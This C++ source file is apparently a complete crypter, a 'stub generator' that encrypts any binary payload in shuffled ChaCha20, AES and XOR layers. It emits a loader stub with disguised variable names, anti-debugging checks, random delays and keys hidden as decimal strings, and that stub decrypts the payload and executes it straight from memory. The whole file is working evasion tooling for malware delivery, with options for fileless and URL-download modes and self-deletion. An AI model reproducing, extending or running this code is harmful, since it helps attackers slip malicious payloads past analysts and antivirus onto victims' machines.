#include <iostream>
#include <fstream>
#include <vector>
#include <random>
#include <chrono>
#include <sstream>
#include <iomanip>
#include <cstring>
#include <algorithm>
#include <thread>
#include <map>

#include "encryption_plugin_interface.h"
#include "encryption_plugin_manager.h"

// Include plugin implementations
#include "plugins/chacha20_plugin.cpp"
#include "plugins/aes_plugin.cpp"
#include "plugins/xor_plugin.cpp"

using namespace EncryptionPlugins;

class UnifiedStubGeneratorWithPlugins {
private:
    // Dynamic entropy system
    struct DynamicEntropy {
        uint64_t timeComponent;
        uint64_t memoryComponent;
        uint64_t threadComponent;
        uint64_t counterComponent = 0;
        
        uint64_t mix() {
            auto now = std::chrono::high_resolution_clock::now();
            timeComponent = now.time_since_epoch().count();
            
            void* p = malloc(1);
            memoryComponent = reinterpret_cast<uintptr_t>(p);
            free(p);
            
            threadComponent = std::hash<std::thread::id>{}(std::this_thread::get_id());
            counterComponent++;
            
            uint64_t result = timeComponent;
            result ^= (memoryComponent << 13) | (memoryComponent >> 51);
            result += threadComponent;
            result ^= (counterComponent << 32) | (counterComponent >> 32);
            
            for (int i = 0; i < 3; i++) {
                result ^= result >> 23;
                result *= 0x2127599bf4325c37ULL;
                result ^= result >> 47;
            }
            
            return result;
        }
    };
    
    DynamicEntropy entropy;
    std::mt19937_64 rng;
    PluginManager& pluginManager;
    
    // Generate obfuscated variable name
    std::string genVarName() {
        static const char* prefixes[] = {
            "sys", "proc", "mem", "exec", "run", "init", "load", "call",
            "func", "meth", "obj", "inst", "ptr", "ref", "val", "data"
        };
        
        static const char* suffixes[] = {
            "Handler", "Manager", "Worker", "Helper", "Service", "Module",
            "Component", "Engine", "Core", "Base", "Util", "Proc"
        };
        
        std::uniform_int_distribution<> prefixDist(0, 15);
        std::uniform_int_distribution<> suffixDist(0, 11);
        std::uniform_int_distribution<> numDist(100, 9999);
        
        return std::string(prefixes[prefixDist(rng)]) + 
               suffixes[suffixDist(rng)] + 
               std::to_string(numDist(rng));
    }
    
    // Convert bytes to decimal string
    std::string bytesToDecimal(const uint8_t* bytes, size_t length) {
        std::string result = "0";
        std::string base = "1";
        
        for (int i = length - 1; i >= 0; i--) {
            std::string byteValue = std::to_string(bytes[i]);
            result = addStrings(result, multiplyStrings(byteValue, base));
            base = multiplyStrings(base, "256");
        }
        
        return result;
    }
    
    // String arithmetic helpers
    std::string addStrings(const std::string& num1, const std::string& num2) {
        std::string result;
        int carry = 0;
        int i = num1.length() - 1;
        int j = num2.length() - 1;
        
        while (i >= 0 || j >= 0 || carry) {
            int sum = carry;
            if (i >= 0) sum += num1[i--] - '0';
            if (j >= 0) sum += num2[j--] - '0';
            carry = sum / 10;
            result = std::to_string(sum % 10) + result;
        }
        
        return result;
    }
    
    std::string multiplyStrings(const std::string& num1, const std::string& num2) {
        int n1 = num1.length(), n2 = num2.length();
        if (n1 == 0 || n2 == 0) return "0";
        
        std::vector<int> result(n1 + n2, 0);
        
        int i_n1 = 0;
        int i_n2 = 0;
        
        for (int i = n1 - 1; i >= 0; i--) {
            int carry = 0;
            int n1_digit = num1[i] - '0';
            i_n2 = 0;
            
            for (int j = n2 - 1; j >= 0; j--) {
                int n2_digit = num2[j] - '0';
                int sum = n1_digit * n2_digit + result[i_n1 + i_n2] + carry;
                carry = sum / 10;
                result[i_n1 + i_n2] = sum % 10;
                i_n2++;
            }
            
            if (carry > 0)
                result[i_n1 + i_n2] += carry;
            
            i_n1++;
        }
        
        int i = result.size() - 1;
        while (i >= 0 && result[i] == 0)
            i--;
        
        if (i == -1)
            return "0";
        
        std::string s = "";
        while (i >= 0)
            s += std::to_string(result[i--]);
        
        return s;
    }
    
public:
    struct StubConfig {
        enum PayloadMethod {
            EMBEDDED,
            FILELESS,
            URL_DOWNLOAD
        };
        
        PayloadMethod payloadMethod = EMBEDDED;
        std::vector<std::string> encryptionLayers = {"ChaCha20", "AES", "XOR"};
        bool useTripleEncryption = true;
        bool randomizeOrder = true;
        bool antiDebug = true;
        bool antiVM = false;
        bool inMemoryExecution = true;
        bool clearMemoryAfter = true;
        bool selfDelete = false;
        bool useDecimalKeys = true;
        bool randomDelays = true;
        std::string outputLanguage = "cpp";
        std::string payloadUrl = "";
    };
    
    struct EncryptionKeys {
        std::map<std::string, EncryptionContext> contexts;
        std::vector<std::string> encryptionOrder;
    };
    
    UnifiedStubGeneratorWithPlugins() : pluginManager(PluginManager::getInstance()) {
        rng.seed(entropy.mix());
    }
    
    // Generate encryption keys using plugins
    EncryptionKeys generateKeys(const StubConfig& config) {
        EncryptionKeys keys;
        
        rng.seed(entropy.mix());
        std::uniform_int_distribution<> dist(0, 255);
        
        // Generate contexts for each encryption method
        for (const auto& method : config.encryptionLayers) {
            auto plugin = pluginManager.createPlugin(method);
            if (!plugin) {
                std::cerr << "Warning: Plugin '" << method << "' not found!" << std::endl;
                continue;
            }
            
            EncryptionContext context;
            
            // Generate key
            size_t keySize = plugin->getKeySize();
            context.key.resize(keySize);
            for (size_t i = 0; i < keySize; i++) {
                context.key[i] = dist(rng);
            }
            
            // Generate nonce if needed
            size_t nonceSize = plugin->getNonceSize();
            if (nonceSize > 0) {
                context.nonce.resize(nonceSize);
                for (size_t i = 0; i < nonceSize; i++) {
                    context.nonce[i] = dist(rng);
                }
            }
            
            // Generate IV if needed
            if (plugin->requiresIV()) {
                context.iv.resize(16);
                for (size_t i = 0; i < 16; i++) {
                    context.iv[i] = dist(rng);
                }
            }
            
            keys.contexts[method] = context;
        }
        
        // Set encryption order
        keys.encryptionOrder = config.encryptionLayers;
        if (config.randomizeOrder && keys.encryptionOrder.size() >= 2) {
            std::shuffle(keys.encryptionOrder.begin(), keys.encryptionOrder.end(), rng);
        }
        
        return keys;
    }
    
    // Apply encryption using plugins
    bool applyEncryption(std::vector<uint8_t>& data, const std::string& method, const EncryptionContext& context) {
        auto plugin = pluginManager.createPlugin(method);
        if (!plugin) {
            std::cerr << "Error: Plugin '" << method << "' not found!" << std::endl;
            return false;
        }
        
        if (!plugin->initialize(context)) {
            std::cerr << "Error: Failed to initialize plugin '" << method << "'" << std::endl;
            return false;
        }
        
        return plugin->encrypt(data, context);
    }
    
    // Generate C++ stub using plugins
    std::string generateCppStub(const std::vector<uint8_t>& payload, const StubConfig& config, const EncryptionKeys& keys) {
        std::stringstream stub;
        
        // Encrypt payload if needed
        std::vector<uint8_t> processedPayload = payload;
        if (config.useTripleEncryption) {
            for (const auto& method : keys.encryptionOrder) {
                auto it = keys.contexts.find(method);
                if (it != keys.contexts.end()) {
                    if (!applyEncryption(processedPayload, method, it->second)) {
                        std::cerr << "Error encrypting with " << method << std::endl;
                    }
                }
            }
        }
        
        // Headers
        stub << "#include <iostream>\n";
        stub << "#include <vector>\n";
        stub << "#include <cstring>\n";
        stub << "#include <cstdint>\n";
        stub << "#include <algorithm>\n";
        if (config.randomDelays) {
            stub << "#include <chrono>\n";
            stub << "#include <thread>\n";
            stub << "#include <random>\n";
        }
        stub << "#ifdef _WIN32\n";
        stub << "#include <windows.h>\n";
        stub << "#else\n";
        stub << "#include <sys/mman.h>\n";
        stub << "#include <unistd.h>\n";
        stub << "#endif\n\n";
        
        // Generate plugin stub code and store class names
        std::map<std::string, std::string> pluginClassNames;
        for (const auto& method : config.encryptionLayers) {
            auto plugin = pluginManager.createPlugin(method);
            if (plugin) {
                std::string className = genVarName();
                pluginClassNames[method] = className;
                stub << plugin->generateStubCode(className, config.useDecimalKeys);
                stub << "\n";
            }
        }
        
        // Variable names
        std::vector<std::string> vars;
        for (int i = 0; i < 20; i++) {
            vars.push_back(genVarName());
        }
        
        // Anti-debug function
        if (config.antiDebug) {
            stub << "bool " << vars[0] << "() {\n";
            stub << "#ifdef _WIN32\n";
            stub << "    if (IsDebuggerPresent()) return true;\n";
            stub << "    BOOL debugged = FALSE;\n";
            stub << "    CheckRemoteDebuggerPresent(GetCurrentProcess(), &debugged);\n";
            stub << "    return debugged;\n";
            stub << "#else\n";
            stub << "    FILE* f = fopen(\"/proc/self/status\", \"r\");\n";
            stub << "    if (!f) return false;\n";
            stub << "    char line[256];\n";
            stub << "    while (fgets(line, sizeof(line), f)) {\n";
            stub << "        if (strncmp(line, \"TracerPid:\", 10) == 0) {\n";
            stub << "            fclose(f);\n";
            stub << "            return atoi(line + 10) != 0;\n";
            stub << "        }\n";
            stub << "    }\n";
            stub << "    fclose(f);\n";
            stub << "    return false;\n";
            stub << "#endif\n";
            stub << "}\n\n";
        }
        
        // Decimal string converter function
        if (config.useDecimalKeys) {
            stub << "std::vector<uint8_t> " << vars[2] << "(const char* decimal, size_t targetSize) {\n";
            stub << "    std::vector<uint8_t> result(targetSize, 0);\n";
            stub << "    std::string num(decimal);\n";
            stub << "    \n";
            stub << "    for (int i = targetSize - 1; i >= 0 && num != \"0\" && !num.empty(); i--) {\n";
            stub << "        int digit = 0;\n";
            stub << "        std::string newNum;\n";
            stub << "        \n";
            stub << "        for (char c : num) {\n";
            stub << "            digit = digit * 10 + (c - '0');\n";
            stub << "            if (digit >= 256) {\n";
            stub << "                newNum += std::to_string(digit / 256);\n";
            stub << "                digit %= 256;\n";
            stub << "            } else if (!newNum.empty() || digit >= 256) {\n";
            stub << "                newNum += '0';\n";
            stub << "            }\n";
            stub << "        }\n";
            stub << "        \n";
            stub << "        result[i] = digit;\n";
            stub << "        num = newNum;\n";
            stub << "    }\n";
            stub << "    \n";
            stub << "    return result;\n";
            stub << "}\n\n";
        }
        
        // Main function
        stub << "int main() {\n";
        
        if (config.antiDebug) {
            stub << "    if (" << vars[0] << "()) return 1;\n\n";
        }
        
        if (config.randomDelays) {
            stub << "    std::this_thread::sleep_for(std::chrono::milliseconds(rand() % 500));\n\n";
        }
        
        // Embedded payload
        stub << "    // Encrypted payload\n";
        stub << "    std::vector<uint8_t> " << vars[3] << " = {";
        for (size_t i = 0; i < processedPayload.size(); i++) {
            if (i % 16 == 0) stub << "\n        ";
            stub << "0x" << std::hex << std::setw(2) << std::setfill('0') 
                 << (int)processedPayload[i];
            if (i < processedPayload.size() - 1) stub << ", ";
        }
        stub << "\n    };\n\n";
        
        // Keys
        stub << "    // Decryption keys\n";
        int keyIndex = 4;
        for (const auto& method : keys.encryptionOrder) {
            auto it = keys.contexts.find(method);
            if (it != keys.contexts.end()) {
                const auto& context = it->second;
                
                if (config.useDecimalKeys) {
                    // Combine key and nonce for decimal conversion
                    std::vector<uint8_t> combinedKey = context.key;
                    combinedKey.insert(combinedKey.end(), context.nonce.begin(), context.nonce.end());
                    
                    stub << "    const char* " << vars[keyIndex] << " = \"" 
                         << bytesToDecimal(combinedKey.data(), combinedKey.size()) << "\";\n";
                    stub << "    auto " << vars[keyIndex + 1] << " = " << vars[2] 
                         << "(" << vars[keyIndex] << ", " << std::dec << combinedKey.size() << ");\n";
                } else {
                    stub << "    unsigned char " << vars[keyIndex] << "[] = {";
                    std::vector<uint8_t> combinedKey = context.key;
                    combinedKey.insert(combinedKey.end(), context.nonce.begin(), context.nonce.end());
                    
                    for (size_t j = 0; j < combinedKey.size(); j++) {
                        if (j > 0) stub << ", ";
                        stub << "0x" << std::hex << std::setw(2) << std::setfill('0') 
                             << (int)combinedKey[j];
                    }
                    stub << "};\n";
                }
                keyIndex += 2;
            }
        }
        stub << "\n";
        
        // Apply decryption in reverse order using plugins
        keyIndex = 4;
        for (int i = keys.encryptionOrder.size() - 1; i >= 0; i--) {
            const auto& method = keys.encryptionOrder[i];
            auto plugin = pluginManager.createPlugin(method);
            if (!plugin) continue;
            
            auto it = keys.contexts.find(method);
            if (it == keys.contexts.end()) continue;
            
            stub << "    // Decrypt " << method << " layer\n";
            
            // Get the class name for this plugin
            std::string className = pluginClassNames[method];
            
            if (config.useDecimalKeys) {
                std::string keyVar = vars[keyIndex + 1] + ".data()";
                std::string decryptCode = plugin->generateDecryptionCode(vars[3], keyVar, it->second.key.size());
                // Replace the placeholder with actual class name
                size_t pos = decryptCode.find("::");
                if (pos != std::string::npos) {
                    decryptCode = className + method + decryptCode.substr(pos);
                }
                stub << "    " << decryptCode;
            } else {
                std::string decryptCode = plugin->generateDecryptionCode(vars[3], vars[keyIndex], it->second.key.size());
                // Replace the placeholder with actual class name
                size_t pos = decryptCode.find("::");
                if (pos != std::string::npos) {
                    decryptCode = className + method + decryptCode.substr(pos);
                }
                stub << "    " << decryptCode;
            }
            
            keyIndex += 2;
            stub << "\n";
        }
        
        // Execute payload
        stub << "    // Execute in memory\n";
        stub << "#ifdef _WIN32\n";
        stub << "    void* " << vars[12] << " = VirtualAlloc(0, " << vars[3] 
             << ".size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n";
        stub << "    if (!" << vars[12] << ") return 1;\n";
        stub << "    memcpy(" << vars[12] << ", " << vars[3] << ".data(), " 
             << vars[3] << ".size());\n";
        stub << "    DWORD oldProtect;\n";
        stub << "    VirtualProtect(" << vars[12] << ", " << vars[3] 
             << ".size(), PAGE_EXECUTE_READ, &oldProtect);\n";
        stub << "    ((void(*)())" << vars[12] << ")();\n";
        stub << "#else\n";
        stub << "    void* " << vars[12] << " = mmap(0, " << vars[3] 
             << ".size(), PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n";
        stub << "    if (" << vars[12] << " == MAP_FAILED) return 1;\n";
        stub << "    memcpy(" << vars[12] << ", " << vars[3] << ".data(), " 
             << vars[3] << ".size());\n";
        stub << "    mprotect(" << vars[12] << ", " << vars[3] 
             << ".size(), PROT_READ | PROT_EXEC);\n";
        stub << "    ((void(*)())" << vars[12] << ")();\n";
        stub << "#endif\n";
        
        stub << "    return 0;\n";
        stub << "}\n";
        
        return stub.str();
    }
    
    // Main generation function
    bool generateStub(const std::string& inputFile, const std::string& outputFile, const StubConfig& config) {
        // Read payload
        std::ifstream input(inputFile, std::ios::binary);
        if (!input) {
            std::cerr << "Error: Cannot open input file: " << inputFile << std::endl;
            return false;
        }
        
        input.seekg(0, std::ios::end);
        size_t fileSize = input.tellg();
        input.seekg(0, std::ios::beg);
        
        std::vector<uint8_t> payload(fileSize);
        input.read(reinterpret_cast<char*>(payload.data()), fileSize);
        input.close();
        
        // Generate keys
        EncryptionKeys keys = generateKeys(config);
        
        // Generate stub
        std::string stubCode;
        if (config.outputLanguage == "cpp") {
            stubCode = generateCppStub(payload, config, keys);
        } else {
            std::cerr << "Error: Unsupported output language: " << config.outputLanguage << std::endl;
            return false;
        }
        
        // Write output
        std::ofstream output(outputFile);
        if (!output) {
            std::cerr << "Error: Cannot create output file: " << outputFile << std::endl;
            return false;
        }
        
        output << stubCode;
        output.close();
        
        std::cout << "[+] Stub generated successfully: " << outputFile << std::endl;
        std::cout << "[+] Encryption methods used: ";
        for (const auto& method : keys.encryptionOrder) {
            std::cout << method << " ";
        }
        std::cout << std::endl;
        
        // Show available plugins
        auto availablePlugins = pluginManager.getAvailablePlugins();
        std::cout << "[+] Available encryption plugins: ";
        for (const auto& plugin : availablePlugins) {
            std::cout << plugin << " ";
        }
        std::cout << std::endl;
        
        return true;
    }
};

// Example usage
int main(int argc, char* argv[]) {
    if (argc < 3) {
        std::cout << "Usage: " << argv[0] << " <input_file> <output_stub.cpp> [options]" << std::endl;
        std::cout << "Options:" << std::endl;
        std::cout << "  --plugins <plugin1,plugin2,...>  Specify encryption plugins to use" << std::endl;
        std::cout << "  --no-triple                      Disable triple encryption" << std::endl;
        std::cout << "  --no-antidebug                   Disable anti-debugging" << std::endl;
        std::cout << "  --list-plugins                   List available plugins" << std::endl;
        return 1;
    }
    
    UnifiedStubGeneratorWithPlugins generator;
    UnifiedStubGeneratorWithPlugins::StubConfig config;
    
    // Parse command line arguments
    for (int i = 3; i < argc; i++) {
        std::string arg = argv[i];
        
        if (arg == "--list-plugins") {
            auto& pm = PluginManager::getInstance();
            auto plugins = pm.getAvailablePlugins();
            std::cout << "Available encryption plugins:" << std::endl;
            for (const auto& name : plugins) {
                auto plugin = pm.createPlugin(name);
                if (plugin) {
                    std::cout << "  - " << name << ": " << plugin->getDescription() << std::endl;
                }
            }
            return 0;
        } else if (arg == "--plugins" && i + 1 < argc) {
            i++;
            config.encryptionLayers.clear();
            std::string plugins = argv[i];
            size_t start = 0;
            size_t end = plugins.find(',');
            while (end != std::string::npos) {
                config.encryptionLayers.push_back(plugins.substr(start, end - start));
                start = end + 1;
                end = plugins.find(',', start);
            }
            config.encryptionLayers.push_back(plugins.substr(start));
        } else if (arg == "--no-triple") {
            config.useTripleEncryption = false;
        } else if (arg == "--no-antidebug") {
            config.antiDebug = false;
        }
    }
    
    std::cout << "=== Unified Stub Generator with Plugin System ===" << std::endl;
    std::cout << "Branch-style encryption plugins enabled" << std::endl;
    std::cout << "============================================" << std::endl << std::endl;
    
    if (generator.generateStub(argv[1], argv[2], config)) {
        std::cout << "\n[+] Generation complete!" << std::endl;
        return 0;
    } else {
        std::cerr << "\n[-] Generation failed!" << std::endl;
        return 1;
    }
}